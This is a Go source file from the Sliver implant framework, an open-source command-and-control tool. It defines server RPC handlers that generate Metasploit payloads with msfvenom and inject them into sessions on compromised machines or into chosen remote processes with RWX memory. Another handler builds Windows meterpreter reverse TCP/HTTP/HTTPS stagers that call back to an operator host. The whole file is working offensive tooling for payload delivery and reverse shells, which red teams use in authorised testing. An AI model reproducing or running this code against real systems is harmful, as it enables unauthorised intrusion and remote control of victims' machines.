package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/msf"

	"github.com/golang/protobuf/proto"
)

// Msf - Helper function to execute MSF payloads on the remote system
func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*commonpb.Empty, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	config := msf.VenomConfig{
		Os:         session.Os,
		Arch:       msf.Arch(session.Arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return nil, err
	}
	data, _ := proto.Marshal(&sliverpb.TaskReq{
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
	})
	timeout := rpc.getTimeout(req)
	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
	if err != nil {
		return nil, err
	}
	return &commonpb.Empty{}, nil
}

// MsfRemote - Inject an MSF payload into a remote process
func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*commonpb.Empty, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	config := msf.VenomConfig{
		Os:         session.Os,
		Arch:       msf.Arch(session.Arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		return nil, err
	}
	data, _ := proto.Marshal(&sliverpb.TaskReq{
		Pid:      req.PID,
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
	})
	timeout := rpc.getTimeout(req)
	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
	if err != nil {
		return nil, err
	}
	return &commonpb.Empty{}, nil
}

// MsfStage - Generate a MSF compatible stage
func (rpc *Server) MsfStage(config *clientpb.EggConfig) ([]byte, error) {
	var (
		stage   []byte
		payload string
		arch    string
		uri     string
	)

	switch config.Arch {
	case "amd64":
		arch = "x64"
	default:
		arch = "x86"
	}

	// TODO: change the hardcoded URI to something dynamically generated
	switch config.Protocol {
	case clientpb.EggConfig_TCP:
		payload = "meterpreter/reverse_tcp"
	case clientpb.EggConfig_HTTP:
		payload = "meterpreter/reverse_http"
		uri = "/login.do"
	case clientpb.EggConfig_HTTPS:
		payload = "meterpreter/reverse_https"
		uri = "/login.do"
	default:
		return stage, fmt.Errorf("Protocol not supported")
	}

	venomConfig := msf.VenomConfig{
		Os:       "windows", // We only support windows at the moment
		Payload:  payload,
		LHost:    config.Host,
		LPort:    uint16(config.Port),
		Arch:     arch,
		Format:   config.Format,
		BadChars: []string{"\\x0a", "\\x00"}, // TODO: make this configurable
		Luri:     uri,
	}
	stage, err := msf.VenomPayload(venomConfig)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return stage, err
	}
	return stage, nil
}
